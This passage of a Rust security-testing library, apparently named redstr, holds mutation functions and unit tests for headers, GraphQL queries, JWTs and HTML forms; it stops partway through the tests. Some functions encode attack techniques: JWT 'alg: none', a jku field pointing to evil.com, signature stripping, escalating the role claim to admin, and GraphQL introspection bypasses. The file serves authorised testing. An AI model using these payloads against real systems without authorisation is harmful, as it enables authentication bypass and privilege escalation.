use crate::rng::SimpleRng;
use crate::transformations::case::case_swap;
use crate::transformations::encoding::url_encode;

/// Generates HTTP header value variations for Caido and web security testing.
///
/// Useful for testing header parsing and WAF rules in tools like Caido.
///
/// # Examples
///
/// ```
/// use redstr::http_header_variation;
/// let header = "application/json";
/// let result = http_header_variation(header);
/// assert!(result.len() > 0);
/// ```
pub fn http_header_variation(input: &str) -> String {
    let mut rng = SimpleRng::new();

    // Common header value variations
    if input.contains("application/json") {
        let variants = [
            "application/json",
            "application/json; charset=utf-8",
            "application/json;charset=utf-8",
            "application/json; charset=UTF-8",
            "Application/JSON",
        ];
        variants[rng.next() as usize % variants.len()].to_string()
    } else if input.contains("text/html") {
        let variants = [
            "text/html",
            "text/html; charset=utf-8",
            "text/html;charset=utf-8",
            "text/html; charset=UTF-8",
            "Text/HTML",
        ];
        variants[rng.next() as usize % variants.len()].to_string()
    } else {
        // Apply case and whitespace variations
        let result = case_swap(input);
        if rng.next() % 2 == 0 {
            result.replace(" ", "").replace(";", "; ")
        } else {
            result
        }
    }
}

/// Generates API endpoint variations for Caido and API security testing.
///
/// Useful for testing API routing and parameter parsing.
///
/// # Examples
///
/// ```
/// use redstr::api_endpoint_variation;
/// let endpoint = "/api/v1/users";
/// let result = api_endpoint_variation(endpoint);
/// // Result should contain the endpoint in some form (case may vary)
/// assert!(result.to_lowercase().contains("api"));
/// ```
pub fn api_endpoint_variation(endpoint: &str) -> String {
    let mut rng = SimpleRng::new();

    let mut result = endpoint.to_string();

    // Add variations
    match rng.next() % 4 {
        0 => {
            // Add trailing slash
            if !result.ends_with('/') {
                result.push('/');
            }
        }
        1 => {
            // Remove trailing slash
            result = result.trim_end_matches('/').to_string();
        }
        2 => {
            // Case variation
            result = case_swap(&result);
        }
        _ => {
            // Add double slashes (common mistake)
            result = result.replace("/", "//").replace("//", "/");
            if result.starts_with("//") {
                result = result[1..].to_string();
            }
        }
    }

    result
}

/// Generates GraphQL query obfuscation for API security testing.
///
/// Useful for Caido and GraphQL security testing tools.
///
/// # Examples
///
/// ```
/// use redstr::graphql_obfuscate;
/// let query = "{ users { name } }";
/// let result = graphql_obfuscate(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_obfuscate(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = String::new();

    for c in query.chars() {
        match c {
            ' ' => {
                // Vary whitespace
                match rng.next() % 3 {
                    0 => result.push(' '),
                    1 => result.push_str("  "), // Double space
                    _ => result.push('\t'),     // Tab
                }
            }
            '{' | '}' => {
                // Sometimes add spaces, sometimes not
                if rng.next() % 2 == 0 {
                    result.push(c);
                } else {
                    result.push(c);
                    if rng.next() % 2 == 0 {
                        result.push(' ');
                    }
                }
            }
            _ => {
                // Case variation for field names
                if c.is_alphabetic() && rng.next() % 4 == 0 {
                    if c.is_uppercase() {
                        result.push_str(&c.to_lowercase().to_string());
                    } else {
                        result.push_str(&c.to_uppercase().to_string());
                    }
                } else {
                    result.push(c);
                }
            }
        }
    }

    result
}

/// Generates session token variations for authentication bypass testing.
///
/// Useful for Caido and web security testing tools.
///
/// # Examples
///
/// ```
/// use redstr::session_token_variation;
/// let token = "abc123xyz";
/// let result = session_token_variation(token);
/// assert!(result.len() > 0);
/// ```
pub fn session_token_variation(token: &str) -> String {
    let mut rng = SimpleRng::new();

    // Common session token manipulation techniques
    match rng.next() % 4 {
        0 => {
            // Case variation
            case_swap(token)
        }
        1 => {
            // Add padding
            format!("{}{}", token, "=".repeat((rng.next() % 3) as usize))
        }
        2 => {
            // URL encode
            url_encode(token)
        }
        _ => {
            // Base64-like padding manipulation
            if token.ends_with('=') {
                token.trim_end_matches('=').to_string()
            } else {
                format!("{}=", token)
            }
        }
    }
}

/// Generates GraphQL variable injection patterns for GraphQL injection testing.
///
/// Useful for red team GraphQL injection testing and blue team input validation.
///
/// # Examples
///
/// ```
/// use redstr::graphql_variable_injection;
/// let query = "query($id: ID!) { user(id: $id) { name } }";
/// let result = graphql_variable_injection(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_variable_injection(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = query.to_string();

    // Common GraphQL variable injection patterns
    let injections = [
        "$id: ID!",
        "$id: ID",
        "$id: String!",
        "$id: Int!",
        "$id: Float!",
        "$id: Boolean!",
        "$id: [ID!]",
        "$id: [String!]",
    ];

    // Try to inject variables in common patterns
    if result.contains("$id") {
        match rng.next() % 3 {
            0 => {
                // Add null variable
                result = result.replace("$id", "$id: null");
            }
            1 => {
                // Add empty string variable
                result = result.replace("$id", "$id: \"\"");
            }
            _ => {
                // Add array variable
                result = result.replace("$id", "$id: []");
            }
        }
    } else if result.contains("query") || result.contains("mutation") {
        // Inject variable declaration
        let injection = injections[rng.next() as usize % injections.len()];
        if result.contains('{') {
            result = result.replace("{", &format!("({}) {{", injection));
        }
    }

    result
}

/// Generates GraphQL introspection bypass patterns for security testing.
///
/// Useful for red team GraphQL security testing and blue team introspection protection validation.
///
/// # Examples
///
/// ```
/// use redstr::graphql_introspection_bypass;
/// let query = "{ __schema { types { name } } }";
/// let result = graphql_introspection_bypass(query);
/// assert!(result.len() > 0);
/// ```
pub fn graphql_introspection_bypass(query: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = query.to_string();

    // Common introspection bypass techniques
    let bypass_patterns = [
        ("__schema", "__Schema"),
        ("__type", "__Type"),
        ("__typename", "__typename"),
        ("__schema", "__schema"),
        ("__type", "__type"),
    ];

    // Apply bypass patterns
    for (original, replacement) in bypass_patterns.iter() {
        if result.contains(original) {
            match rng.next() % 4 {
                0 => {
                    // Case variation
                    result = result.replace(original, replacement);
                }
                1 => {
                    // Add aliases
                    result = result.replace(original, &format!("alias: {}", original));
                }
                2 => {
                    // Fragment spread
                    result = result.replace(original, &format!("... on {}", original));
                }
                _ => {
                    // Keep original but add whitespace
                    result = result.replace(original, &format!("{} ", original));
                }
            }
            break;
        }
    }

    // Add comment-based bypass
    if rng.next() % 2 == 0 {
        result = result.replace("{", "{# comment #");
    }

    result
}

/// Generates JWT header manipulation patterns for JWT security testing.
///
/// Useful for red team JWT token manipulation and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_header_manipulation;
/// let header = r#"{"alg":"HS256","typ":"JWT"}"#;
/// let result = jwt_header_manipulation(header);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_header_manipulation(header: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = header.to_string();

    // Common JWT header manipulation techniques
    match rng.next() % 5 {
        0 => {
            // Change algorithm to none
            result = result.replace("HS256", "none");
            result = result.replace("RS256", "none");
            result = result.replace("ES256", "none");
        }
        1 => {
            // Remove typ field
            result = result.replace(r#""typ":"JWT","#, "");
            result = result.replace(r#","typ":"JWT""#, "");
        }
        2 => {
            // Add jku (JSON Key URL) field
            result = result.replace("{", r#"{"jku":"http://evil.com/key.json","#);
        }
        3 => {
            // Add jwk (JSON Web Key) field
            result = result.replace("{", r#"{"jwk":{"kty":"RSA","n":"..."},"#);
        }
        _ => {
            // Case variation
            result = case_swap(&result);
        }
    }

    result
}

/// Generates JWT payload obfuscation patterns for JWT security testing.
///
/// Useful for red team JWT token manipulation and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_payload_obfuscate;
/// let payload = r#"{"sub":"user123","role":"admin"}"#;
/// let result = jwt_payload_obfuscate(payload);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_payload_obfuscate(payload: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = payload.to_string();

    // Common JWT payload obfuscation techniques
    match rng.next() % 4 {
        0 => {
            // Add extra fields
            result = result.replace("{", r#"{"extra":"value","#);
        }
        1 => {
            // Modify role claims
            result = result.replace(r#""role":"user""#, r#""role":"admin""#);
            result = result.replace(r#""role":"guest""#, r#""role":"admin""#);
        }
        2 => {
            // Add nested objects
            result = result.replace(r#""sub":"#, r#""sub":{"id":"#);
            if !result.contains("}") {
                result.push('}');
            }
        }
        _ => {
            // URL encode parts
            if let Some(start) = result.find(':') {
                let (before, after) = result.split_at(start + 1);
                result = format!("{}{}", before, url_encode(after));
            }
        }
    }

    result
}

/// Generates JWT algorithm confusion patterns for JWT security testing.
///
/// Useful for red team JWT algorithm confusion attacks and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_algorithm_confusion;
/// let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
/// let result = jwt_algorithm_confusion(token);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_algorithm_confusion(token: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = token.to_string();

    // Common algorithm confusion patterns
    let algorithms = ["HS256", "RS256", "ES256", "none", "HS384", "HS512"];

    // Replace algorithm in token (simplified - real implementation would decode/encode)
    for alg in algorithms.iter() {
        if result.contains(alg) {
            let new_alg = algorithms[rng.next() as usize % algorithms.len()];
            result = result.replace(alg, new_alg);
            break;
        }
    }

    // If no algorithm found, try to inject
    if !result.contains("alg") {
        let alg = algorithms[rng.next() as usize % algorithms.len()];
        // This is a simplified version - real JWT manipulation requires base64 decode/encode
        result = format!("{}.{}.", alg, result);
    }

    result
}

/// Generates JWT signature bypass patterns for JWT security testing.
///
/// Useful for red team JWT signature bypass attempts and blue team JWT validation testing.
///
/// # Examples
///
/// ```
/// use redstr::jwt_signature_bypass;
/// let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
/// let result = jwt_signature_bypass(token);
/// assert!(result.len() > 0);
/// ```
pub fn jwt_signature_bypass(token: &str) -> String {
    let mut rng = SimpleRng::new();
    let parts: Vec<&str> = token.split('.').collect();

    if parts.len() >= 3 {
        // Remove or modify signature
        match rng.next() % 4 {
            0 => {
                // Remove signature entirely
                format!("{}.{}.", parts[0], parts[1])
            }
            1 => {
                // Empty signature
                format!("{}.{}.", parts[0], parts[1])
            }
            2 => {
                // Truncated signature
                if !parts[2].is_empty() {
                    let truncated = &parts[2][..parts[2].len().saturating_sub(1)];
                    format!("{}.{}.{}", parts[0], parts[1], truncated)
                } else {
                    token.to_string()
                }
            }
            _ => {
                // Modified signature (simplified)
                format!("{}.{}.modified", parts[0], parts[1])
            }
        }
    } else {
        token.to_string()
    }
}

/// Generates HTML input field attribute variations for input validation testing.
///
/// Useful for red team input field bypass testing and blue team validation testing.
///
/// # Examples
///
/// ```
/// use redstr::html_input_attribute_variation;
/// let input = r#"<input type="text" name="username">"#;
/// let result = html_input_attribute_variation(input);
/// assert!(result.len() > 0);
/// ```
pub fn html_input_attribute_variation(input: &str) -> String {
    let mut rng = SimpleRng::new();
    let mut result = input.to_string();

    // Common attribute manipulation techniques
    match rng.next() % 6 {
        0 => {
            // Add autofocus attribute
            result = result.replace("<input", "<input autofocus");
        }
        1 => {
            // Add autocomplete off
            result = result.replace("<input", r#"<input autocomplete="off""#);
        }
        2 => {
            // Add hidden attribute
            result = result.replace("<input", "<input hidden");
        }
        3 => {
            // Add required attribute
            result = result.replace("<input", "<input required");
        }
        4 => {
            // Add maxlength bypass
            result = result.replace("maxlength=", "data-maxlength=");
        }
        _ => {
            // Case variation on attributes
            result = case_swap(&result);
        }
    }

    result
}

/// Generates HTML form field name obfuscation for form bypass testing.
///
/// Useful for red team form field manipulation and blue team validation testing.
///
/// # Examples
///
/// ```
/// use redstr::html_form_field_obfuscate;
/// let field = "username";
/// let result = html_form_field_obfuscate(field);
/// assert!(result.len() > 0);
/// ```
pub fn html_form_field_obfuscate(field: &str) -> String {
    let mut rng = SimpleRng::new();

    match rng.next() % 5 {
        0 => {
            // Add array notation
            format!("{}[]", field)
        }
        1 => {
            // Add nested notation
            format!("user[{}]", field)
        }
        2 => {
            // Add dot notation
            format!("form.{}", field)
        }
        3 => {
            // Case variation
            case_swap(field)
        }
        _ => {
            // Add underscore prefix/suffix
            if rng.next() % 2 == 0 {
                format!("_{}", field)
            } else {
                format!("{}_", field)
            }
        }
    }
}

/// Generates HTML input type attribute variations for input validation bypass testing.
///
/// Useful for red team input type bypass and blue team validation testing.
///
/// # Examples
///
/// ```
/// use redstr::html_input_type_variation;
/// let input_type = "password";
/// let result = html_input_type_variation(input_type);
/// assert!(result.len() > 0);
/// ```
pub fn html_input_type_variation(input_type: &str) -> String {
    let mut rng = SimpleRng::new();

    // Common type variations and bypasses
    let variations = [
        "text",
        "password",
        "email",
        "number",
        "tel",
        "url",
        "search",
        "hidden",
        "submit",
        "button",
        "file",
        "date",
        "datetime-local",
        "time",
        "week",
        "month",
        "color",
        "range",
    ];

    if rng.next() % 3 == 0 {
        // Return a random type
        variations[rng.next() as usize % variations.len()].to_string()
    } else {
        // Apply case variation to input
        case_swap(input_type)
    }
}

/// Generates HTML form action URL variations for form submission bypass testing.
///
/// Useful for red team form action manipulation and blue team CSRF protection testing.
///
/// # Examples
///
/// ```
/// use redstr::html_form_action_variation;
/// let action = "/api/login";
/// let result = html_form_action_variation(action);
/// assert!(result.len() > 0);
/// ```
pub fn html_form_action_variation(action: &str) -> String {
    let mut rng = SimpleRng::new();
    let result = action.to_string();

    match rng.next() % 5 {
        0 => {
            // Add query parameters
            if result.contains('?') {
                format!("{}&redirect=/", result)
            } else {
                format!("{}?redirect=/", result)
            }
        }
        1 => {
            // Add trailing slash variation
            if result.ends_with('/') {
                let trimmed = result.trim_end_matches('/').to_string();
                if trimmed.is_empty() {
                    "/".to_string() // Keep at least one slash for root
                } else {
                    trimmed
                }
            } else {
                format!("{}/", result)
            }
        }
        2 => {
            // Double slash - replace single slashes with double except at the start
            if result.starts_with('/') && result.len() > 1 {
                format!("/{}", result[1..].replace("/", "//"))
            } else {
                result.replace("/", "//")
            }
        }
        3 => {
            // URL encode parts
            url_encode(&result)
        }
        _ => {
            // Case variation
            case_swap(&result)
        }
    }
}

/// Generates HTML input value attribute obfuscation for XSS and injection testing.
///
/// Useful for red team XSS payload insertion and blue team input sanitization testing.
///
/// # Examples
///
/// ```
/// use redstr::html_input_value_obfuscate;
/// let value = "user@example.com";
/// let result = html_input_value_obfuscate(value);
/// assert!(result.len() > 0);
/// ```
pub fn html_input_value_obfuscate(value: &str) -> String {
    let mut rng = SimpleRng::new();
    let result = value.to_string();

    match rng.next() % 4 {
        0 => {
            // HTML entity encode
            result
                .chars()
                .map(|c| {
                    if c.is_alphanumeric() {
                        c.to_string()
                    } else {
                        format!("&#{};", c as u32)
                    }
                })
                .collect()
        }
        1 => {
            // URL encode
            url_encode(&result)
        }
        2 => {
            // Unicode escape
            result
                .chars()
                .map(|c| {
                    if rng.next() % 3 == 0 && !c.is_alphanumeric() {
                        format!("\\u{:04x}", c as u32)
                    } else {
                        c.to_string()
                    }
                })
                .collect()
        }
        _ => {
            // Add quotes variation
            if result.contains('"') {
                result.replace('"', "'")
            } else {
                result
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_http_header_variation() {
        let header = "application/json";
        let result = http_header_variation(header);
        assert!(!result.is_empty());
        // Should contain application or json (case may vary)
        assert!(
            result.to_lowercase().contains("application") || result.to_lowercase().contains("json")
        );
    }

    #[test]
    fn test_api_endpoint_variation() {
        let endpoint = "/api/v1/users";
        let result = api_endpoint_variation(endpoint);
        assert!(result.to_lowercase().contains("api"));
    }

    #[test]
    fn test_graphql_obfuscate() {
        let query = "{ users { name } }";
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("users"));
    }

    #[test]
    fn test_graphql_obfuscate_empty_string() {
        let query = "";
        let result = graphql_obfuscate(query);
        assert_eq!(result, "");
    }

    #[test]
    fn test_graphql_obfuscate_preserves_braces() {
        let query = "{ users { name } }";
        let result = graphql_obfuscate(query);
        // Should preserve the basic structure with braces
        assert!(result.contains('{') && result.contains('}'));
    }

    #[test]
    fn test_graphql_obfuscate_handles_whitespace() {
        let query = "{ users { name email } }";
        let result = graphql_obfuscate(query);
        // Should have some whitespace variations and preserve structure
        assert!(!result.is_empty());
        assert!(result.to_lowercase().contains("users"));
    }

    #[test]
    fn test_graphql_obfuscate_complex_query() {
        let query = "{ users(limit: 10) { name email posts { title } } }";
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("users"));
        assert!(result.contains('{') && result.contains('}'));
    }

    #[test]
    fn test_graphql_obfuscate_nested_fields() {
        let query = "{ user { profile { avatar { url } } } }";
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("user"));
    }

    #[test]
    fn test_graphql_obfuscate_with_arguments() {
        let query = r#"{ user(id: "123") { name } }"#;
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("user"));
        assert!(result.contains("123"));
    }

    #[test]
    fn test_graphql_obfuscate_mutation() {
        let query = "mutation { createUser(name: \"test\") { id } }";
        let result = graphql_obfuscate(query);
        assert!(result.to_lowercase().contains("mutation") || result.contains("createUser"));
    }

    #[test]
    fn test_graphql_obfuscate_multiple_fields() {
        let query = "{ user { id name email role } }";
        let result = graphql_obfuscate(query);
        assert!(!result.is_empty());
        assert!(result.contains('{'));
    }

    #[test]
    fn test_graphql_obfuscate_special_characters() {
        let query = "{ user_profile { first_name last_name } }";
        let result = graphql_obfuscate(query);
        assert!(result.contains("_") || result.contains("user") || result.contains("profile"));
    }

    #[test]
    fn test_graphql_obfuscate_preserves_punctuation() {
        let query = "{ users(filter: { active: true }) { name } }";
        let result = graphql_obfuscate(query);
        assert!(result.contains(':') && result.contains('{'));
    }

    #[test]
    fn test_session_token_variation() {
        let token = "abc123xyz";
        let result = session_token_variation(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_variable_injection() {
        let query = "query($id: ID!) { user(id: $id) { name } }";
        let result = graphql_variable_injection(query);
        assert!(!result.is_empty());
        assert!(result.contains("user") || result.contains("query"));
    }

    #[test]
    fn test_graphql_variable_injection_empty_string() {
        let query = "";
        let result = graphql_variable_injection(query);
        assert_eq!(result, "");
    }

    #[test]
    fn test_graphql_variable_injection_with_id_variable() {
        let query = "query($id: ID!) { user(id: $id) { name } }";
        let result = graphql_variable_injection(query);
        // Should contain either modified $id or original query structure
        assert!(result.contains("$id") || result.contains("user"));
    }

    #[test]
    fn test_graphql_variable_injection_null_value() {
        let query = "query { user(id: $id) { name } }";
        let result = graphql_variable_injection(query);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_variable_injection_without_variables() {
        let query = "{ users { name } }";
        let result = graphql_variable_injection(query);
        // Should still return something
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_variable_injection_mutation() {
        let query = "mutation($input: UserInput!) { createUser(input: $input) { id } }";
        let result = graphql_variable_injection(query);
        assert!(result.contains("mutation") || result.contains("$input"));
    }

    #[test]
    fn test_graphql_variable_injection_multiple_variables() {
        let query = "query($id: ID!, $name: String!) { user(id: $id, name: $name) { email } }";
        let result = graphql_variable_injection(query);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_variable_injection_array_type() {
        let query = "query($ids: [ID!]!) { users(ids: $ids) { name } }";
        let result = graphql_variable_injection(query);
        assert!(result.contains("users") || result.contains("$ids"));
    }

    #[test]
    fn test_graphql_variable_injection_with_braces() {
        let query = "query { user { profile { name } } }";
        let result = graphql_variable_injection(query);
        assert!(result.contains('{'));
    }

    #[test]
    fn test_graphql_variable_injection_preserves_structure() {
        let query = "query GetUser { user { id } }";
        let result = graphql_variable_injection(query);
        assert!(result.to_lowercase().contains("user") || result.contains("query"));
    }

    #[test]
    fn test_graphql_introspection_bypass() {
        let query = "{ __schema { types { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(!result.is_empty());
        assert!(result.contains("schema") || result.contains("__"));
    }

    #[test]
    fn test_graphql_introspection_bypass_empty_string() {
        let query = "";
        let result = graphql_introspection_bypass(query);
        // Empty input may result in empty output or comment injection (contains "{# comment #")
        assert!(result.is_empty() || result.contains("#"));
    }

    #[test]
    fn test_graphql_introspection_bypass_schema() {
        let query = "{ __schema { queryType { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains("schema") || result.contains("Schema") || result.contains("__"));
    }

    #[test]
    fn test_graphql_introspection_bypass_type() {
        let query = "{ __type(name: \"User\") { fields { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains("type") || result.contains("Type") || result.contains("User"));
    }

    #[test]
    fn test_graphql_introspection_bypass_typename() {
        let query = "{ user { __typename name } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains("typename") || result.contains("user"));
    }

    #[test]
    fn test_graphql_introspection_bypass_with_alias() {
        let query = "{ mySchema: __schema { types { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_introspection_bypass_case_variation() {
        let query = "{ __schema { directives { name } } }";
        let result = graphql_introspection_bypass(query);
        // Should contain some variation
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_introspection_bypass_fragment() {
        let query = "{ __schema { ...SchemaFields } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains("schema") || result.contains("Schema"));
    }

    #[test]
    fn test_graphql_introspection_bypass_nested() {
        let query = "{ __schema { types { fields { name type { name } } } } }";
        let result = graphql_introspection_bypass(query);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_graphql_introspection_bypass_multiple_introspection() {
        let query = "{ __schema { types { name } } __type(name: \"Query\") { name } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains("schema") || result.contains("type") || result.contains("__"));
    }

    #[test]
    fn test_graphql_introspection_bypass_preserves_braces() {
        let query = "{ __schema { types { name } } }";
        let result = graphql_introspection_bypass(query);
        assert!(result.contains('{') && result.contains('}'));
    }

    #[test]
    fn test_jwt_header_manipulation() {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_empty_string() {
        let header = "";
        let result = jwt_header_manipulation(header);
        // Empty input handling - function returns empty (no replacements possible)
        assert!(result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_alg_to_none() {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        // May change alg to none or other variations
        assert!(result.contains("alg") || result.contains("{"));
    }

    #[test]
    fn test_jwt_header_manipulation_rs256() {
        let header = r#"{"alg":"RS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_es256() {
        let header = r#"{"alg":"ES256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_typ_field() {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        // typ field may be removed or preserved
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_jku_injection() {
        let header = r#"{"alg":"RS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_jwk_injection() {
        let header = r#"{"alg":"RS256"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_minimal() {
        let header = r#"{"alg":"HS256"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_with_kid() {
        let header = r#"{"alg":"HS256","typ":"JWT","kid":"key1"}"#;
        let result = jwt_header_manipulation(header);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_header_manipulation_preserves_structure() {
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let result = jwt_header_manipulation(header);
        // Should still be JSON-like
        assert!(result.contains("{") || result.contains("alg"));
    }

    #[test]
    fn test_jwt_payload_obfuscate() {
        let payload = r#"{"sub":"user123","role":"admin"}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_empty_string() {
        let payload = "";
        let result = jwt_payload_obfuscate(payload);
        // Empty input - may add '}' in some cases or return empty
        assert!(result.is_empty() || result == "}");
    }

    #[test]
    fn test_jwt_payload_obfuscate_role_modification() {
        let payload = r#"{"sub":"user123","role":"user"}"#;
        let result = jwt_payload_obfuscate(payload);
        // May modify role or add extra fields
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_guest_role() {
        let payload = r#"{"sub":"user456","role":"guest"}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_extra_fields() {
        let payload = r#"{"sub":"user123"}"#;
        let result = jwt_payload_obfuscate(payload);
        // May add extra fields
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_nested_objects() {
        let payload = r#"{"sub":"user123","data":{"value":"test"}}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_with_exp() {
        let payload = r#"{"sub":"user123","exp":1735689600}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_with_iat() {
        let payload = r#"{"sub":"user123","iat":1700000000,"role":"admin"}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_minimal() {
        let payload = r#"{"sub":"user"}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_complex() {
        let payload = r#"{"sub":"user123","role":"admin","permissions":["read","write"]}"#;
        let result = jwt_payload_obfuscate(payload);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_payload_obfuscate_preserves_structure() {
        let payload = r#"{"sub":"user123","role":"admin"}"#;
        let result = jwt_payload_obfuscate(payload);
        // Should maintain JSON-like structure
        assert!(result.contains("{") || result.contains("sub") || result.contains("role"));
    }

    #[test]
    fn test_jwt_algorithm_confusion() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_empty_string() {
        let token = "";
        let result = jwt_algorithm_confusion(token);
        // Empty input handling - function injects algorithm since no "alg" found
        assert!(!result.is_empty() && result.contains("."));
    }

    #[test]
    fn test_jwt_algorithm_confusion_hs256() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature";
        let result = jwt_algorithm_confusion(token);
        // May change algorithm
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_rs256() {
        let token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_es256() {
        let token = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.payload.signature";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_none() {
        let token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.payload.";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_without_alg() {
        let token = "header.payload.signature";
        let result = jwt_algorithm_confusion(token);
        // Should inject algorithm
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_hs384() {
        let token = "eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.payload.signature";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_hs512() {
        let token = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.payload.signature";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_malformed() {
        let token = "notavalidtoken";
        let result = jwt_algorithm_confusion(token);
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_algorithm_confusion_preserves_parts() {
        let token = "header.payload.signature";
        let result = jwt_algorithm_confusion(token);
        // Should contain some parts
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_signature_bypass() {
        let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        let result = jwt_signature_bypass(token);
        assert!(!result.is_empty());
        // Should contain at least the first two parts
        assert!(result.contains("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"));
    }

    #[test]
    fn test_jwt_signature_bypass_empty_string() {
        let token = "";
        let result = jwt_signature_bypass(token);
        assert_eq!(result, "");
    }

    #[test]
    fn test_jwt_signature_bypass_two_parts() {
        let token = "header.payload";
        let result = jwt_signature_bypass(token);
        // Should return as-is since it's malformed
        assert_eq!(result, token);
    }

    #[test]
    fn test_jwt_signature_bypass_removes_signature() {
        let token = "header.payload.signature";
        let result = jwt_signature_bypass(token);
        // May remove signature or modify it
        assert!(!result.is_empty());
    }

    #[test]
    fn test_jwt_signature_bypass_empty_signature() {
        let token = "header.payload.";
        let result = jwt_signature_bypass(token);
        assert!(result.contains("header") && result.contains("payload"));
    }

    #[test]
    fn test_jwt_signature_bypass_long_signature() {
        let token = "header.payload.verylongsignaturestringwithmanycharacters";
